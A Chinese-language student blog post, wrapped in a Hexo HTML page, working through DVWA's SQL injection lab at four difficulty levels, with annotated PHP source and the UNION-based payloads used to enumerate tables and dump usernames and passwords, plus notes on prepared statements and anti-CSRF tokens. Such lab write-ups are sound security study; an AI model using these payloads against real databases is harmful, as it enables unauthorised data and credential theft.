@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>DVWA SQL injection | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    DVWA SQL injection
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA-SQL-injection"><span class="toc-number">1.</span> <span class="toc-text">DVWA SQL injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low级别"><span class="toc-number">1.1.</span> <span class="toc-text">Low级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码："><span class="toc-number">1.1.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium级别"><span class="toc-number">1.2.</span> <span class="toc-text">Medium级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码：-1"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战-1"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High级别"><span class="toc-number">1.3.</span> <span class="toc-text">High级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码：-2"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战-2"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible级别"><span class="toc-number">1.4.</span> <span class="toc-text">Impossible级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码：-3"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">源码：</span></a></li></ol></li></ol></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="DVWA-SQL-injection"><a href="#DVWA-SQL-injection" class="headerlink" title="DVWA SQL injection"></a>DVWA SQL injection</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php 
+if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { //isset()函数用于检测变量是否已设置并且非null。被设置返回TRUE；REQUEST用于获取表单数据，表单属性名为submit，判断是否存在
+    // Get input 
+    $id = $_REQUEST[ &#39;id&#39; ]; 
+//定义变量id存传过来的id数据
+    // Check database 
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
+//按照id值找first_name,last_name的值
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); 
+//mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询
+//connection：MySQL连接，query规定查询字符串，resultmode可省
+//result存数据
+//or后面是判断是否连接成功，三元判断，执行了就返回真
+    // Get results 
+    while( $row = mysqli_fetch_assoc( $result ) ) { 
+        // Get values 
+        $first = $row[&quot;first_name&quot;]; 
+        $last  = $row[&quot;last_name&quot;]; 
+        // Feedback for end user 
+//打印输出结果
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; 
+    } 
+    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); //关闭数据库连接
+}
+?&gt;
+</code></pre>
+<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>1.判断是否存在注入</p>
+<p>2.判断字段数 order by</p>
+<p>输入1’order by2#    两个字段</p>
+<p>问题1：为什么不能用–+，在http请求中不是不允许出现#吗，可是这边#怎么能用?</p>
+<p>答：（还搞不清楚）</p>
+<p>3.联合查询注入</p>
+<p>1)输入-1’union select2,3#发现两个位置均能显示</p>
+<p>4.payload</p>
+<p>1)输入 -1’union select user(),database()# 注当前用户名和数据库名</p>
+<p>2)输入</p>
+<p>-1’ union select 1,group_concat(TABLE_NAME,0x3c2f62723e) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#</p>
+<p>遇到提示：Error: Illegal mix of collations for operation ‘UNION’，这种错误的成因是因为编码的缘故，字符集的编码不同所导致的，要解决就配合convart、using latin1函数来解决。</p>
+<p>（<a href="https://blog.csdn.net/qq_35569814/article/details/100274561" target="_blank" rel="noopener">这边参考的题解</a>）</p>
+<p>CONVERT() 函数是把日期转换为新数据类型的通用函数。</p>
+<p>大致poyload如下</p>
+<p>UNION SELECT 1,2,3,4,5,6,7,convert(Table_Name using latin1) from information_schema.tables Where table_Schema=database()–+</p>
+<p>故改成输入</p>
+<p>-1’ union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#得到表名</p>
+<p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200501004352747.png" alt=""></p>
+<p>3)输入</p>
+<p> -1’ union select 1,convert(column_NAME using latin1) from information_schema.columnS where TABLE_name=’users’#</p>
+<p>得到表中字段名</p>
+<p>4）输入</p>
+<p>-1’ union select 1,convert(user using latin1) from users#</p>
+<p>得到字段值</p>
+<p><a href="http://www.langzi.fun/DVWA源码解读之SQL-Injection.html" target="_blank" rel="noopener">参考的题解</a></p>
+<h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php 
+
+if( isset( $_POST[ &#39;Submit&#39; ] ) ) { 
+    // Get input 
+    $id = $_POST[ &#39;id&#39; ]; 
+
+    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); 
+// mysqli_real_escape_string(connection,escapestring) 函数转义在 SQL 语句中使用的字符串//中的特殊字符。
+//$GLOBALS[ ]是所有已定义全局变量组成的数组。
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; 
+//由$query此句可知输入的id不用特殊字符
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; ); 
+//mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询
+//connection：MySQL连接，query规定查询字符串，resultmode可省
+//result存数据
+//or后面是判断是否连接成功，三元判断，执行了就返回真
+  // Get results 
+while( $row = mysqli_fetch_assoc( $result ) ) { 
+//mysqli_fetch_assoc(result)函数从结果集中取得一行作为关联数组。
+//返回的字段名区分大小写，每个字段名做为row的键名，数据是对应的单元值。所以才有$row[&quot;first_name&quot;]这种形式出来
+        // Display values 
+        $first = $row[&quot;first_name&quot;]; 
+        $last  = $row[&quot;last_name&quot;]; 
+
+        // Feedback for end user 
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; 
+    } 
+
+} 
+
+// This is used later on in the index.php page 
+// Setting it here so we can close the database connection in here like in the rest of the source scripts 
+$query  = &quot;SELECT COUNT(*) FROM users;&quot;; 
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); 
+$number_of_rows = mysqli_fetch_row( $result )[0]; 
+//不是很理解为什么还要搞出这么一段，为什么要查询全部字段并存到result？
+
+mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); 
+?&gt;</code></pre>
+<h4 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h4><p>1.判断注入：数字型注入（因为网站没法输入，故下面的步骤都用burpsuite，其余步骤与low级别差不多，同样得配合convert函数，否则会出错）（用burpsuite的意思是直接在burpsuite的界面操作，send to repeater之后点击action）</p>
+<p>2.判断字段数</p>
+<p>输入1 order by 1# 两个字段</p>
+<p>3.联合查询注入</p>
+<p>输入1 union select 1,2# 发现两个位置都可以显示</p>
+<p>问题2：为什么不用把1改成-1呢？之前看到的说法是前边出错才能执行后面的，可是我觉得没出错也能执行后面的啊？</p>
+<p>答：因为sqli-labs是只能显示一条记录（mysql_fetch_array()仅被调用一次），如果前面是1的话会显示1而不显示后边的操作结果，dvwa不只显示一条记录（mysqli_fetch_assoc()可多次调用），所以-1或者1无所谓。</p>
+<p>4.payload</p>
+<p>1）输入1 union select 1,database()#注数据库名</p>
+<p>2）输入1 union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=database()#注表名</p>
+<p>这边得用database()，因为单引号会被转义。</p>
+<p>3）输入1 union select 1,convert(column_name using latin1) from information_schema.columns where table_name=0x7573657273 # 注表中字段名</p>
+<p><a href="http://www.mamicode.com/info-detail-2778166.html" target="_blank" rel="noopener">用十六进制进行绕过，SQL绕过基础</a></p>
+<p>4）输入1 union select user,password from users#得字段值</p>
+<p><a href="https://www.cnblogs.com/amberhome-wei/p/12048339.html" target="_blank" rel="noopener">参考题解</a></p>
+<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php
+
+if( isset( $_SESSION [ &#39;id&#39; ] ) ) {//session变量用于存储储关于用户会话（session）的信息，或者更改用户会话（session）的设置。所以才能弹出另一个窗口出来。
+ // Get input
+    $id = $_SESSION[ &#39;id&#39; ];
+
+    // Check database
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;
+
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; );
+////mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询。
+//$GLOBALS[&quot;___mysqli_ston&quot;]只是一个自定义全局变量？
+//mysqli_ston是哪里来的呢？上面也完全没提到，所以是连接数据库？
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);    //is_null() 检测变量是否为null；
+// 注意：空字符串：已经分配了存储空间，但是没有存储东西;NULL：没有分配存储空间。  
+//
+}
+?&gt;</code></pre>
+<h4 id="实战-2"><a href="#实战-2" class="headerlink" title="实战"></a>实战</h4><p>1.判断注入：字符型注入</p>
+<p>没有给出确切的错误信息，但试过发现跟low级别的解题过程没什么区别。</p>
+<p>2.判断字段数：输入1’ order by 3# 两个字段</p>
+<p>3.联合查询注入: -1’ union select 1,2 #</p>
+<p>4.payload:</p>
+<p>1）输入-1’ union select 1,database()# 注数据库名</p>
+<p>2）输入-1’ union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#得到表名</p>
+<p>3）输入-1’ union select 1,convert(column_NAME using latin1) from information_schema.columnS where TABLE_name=’users’#</p>
+<p>得到表中字段名</p>
+<p>4）输入</p>
+<p>-1’ union select 1,convert(user using latin1) from users#</p>
+<p>得到字段值</p>
+<h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php
+
+if( isset( $_GET[ &#39;Submit&#39; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+//这句是为了防止CSRF攻击，即防止跨站点请求伪造攻击，CSRF相关注释在下边
+//token解释在下边
+    // Get input
+    $id = $_GET[ &#39;id&#39; ];
+
+    // Was a number entered?
+if(is_numeric( $id )) {
+//is_numeric() 函数用于检测变量是否为数字或数字字符串。
+        // Check the database
+        $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );//这个是预编译
+//预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程。预编译语句能防止sql注入。
+//在impossible.php中还限制了只允许返回一条数据。就是if( $data-&gt;rowCount() == 1 ) 。
+        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );
+        $data-&gt;execute();
+        $row = $data-&gt;fetch();
+
+        // Make sure only 1 result is returned
+        if( $data-&gt;rowCount() == 1 ) {
+            // Get values
+            $first = $row[ &#39;first_name&#39; ];
+            $last  = $row[ &#39;last_name&#39; ];
+
+            // Feedback for end user
+            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();//在登录界面/var/www/html/login.php和本页面都能生成Token
+//具体的函数在dvwaPhpIds.inc.php中，验证在impossible.php（就是本篇代码）中
+//请注意：要避免&quot;加token但不进行校验&quot;的情况。在session中增加了token，但服务端没//有对token进行验证，那根本起不到防范的作用。提交的浏览器的URL每次的token都是//不一样的。
+?&gt;</code></pre>
+<p>1.Check Anti-CSRF token：</p>
+<p>（1）CSRF，Cross Site Request Forgery，中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p>
+<p>CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。</p>
+<p>CSRF攻击的一般是由服务端解决。</p>
+<p>应对CSRF的方法有</p>
+<p>1）尽量使用POST，限制GET</p>
+<p>2）浏览器Cookie策略</p>
+<p>3）加验证码</p>
+<p>4）Referer Check ，例如：防止图片盗链</p>
+<p>5）Anti CSRF Token</p>
+<p>上面的代码用的是第5点。</p>
+<p>（2）Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。这样可以减轻服务器的压力，减少频繁的查询数据库。</p>
+<p>使用Token有2种方式：</p>
+<p>1）用设备号/设备mac地址作为Token</p>
+<p>2）用session值作为Token用session值作为Token</p>
+<p>Token的好处是服务端不需要存储相应信息。</p>
+<p>大概的流程是这样的：</p>
+<p>1）客户端使用用户名跟密码请求登录</p>
+<p>2）服务端收到请求，去验证用户名与密码</p>
+<p>3）验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p>
+<p>4）客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p>
+<p>5）客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p>
+<p>6）服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p>
+<p>当然，如果Token被不怀好意的人从中间获取到该信息时，也容易被利用，非法获取数据。 想增强安全性，一般可以在服务端生成时配合时间戳，服务端在接收到client发来带token的信息时，先检测token的时间戳信息，如果该时间戳在超过某个时间点时，就认为过期，需要重新获取。</p>
+<p>Token一般用在两个地方:</p>
+<p>1）防止表单重复提交：服务器端第一次验证相同过后，会将session中的Token值更新。若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。</p>
+<p>2）anti csrf攻击（跨站点请求伪造）：服务器端会对Token值进行验证，判断是否和session中的Token值相等。若相等，则可以证明请求有效，不是伪造的。</p>
+<p><a href="https://www.pianshen.com/article/2567257653/" target="_blank" rel="noopener">参考博客</a></p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-14</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
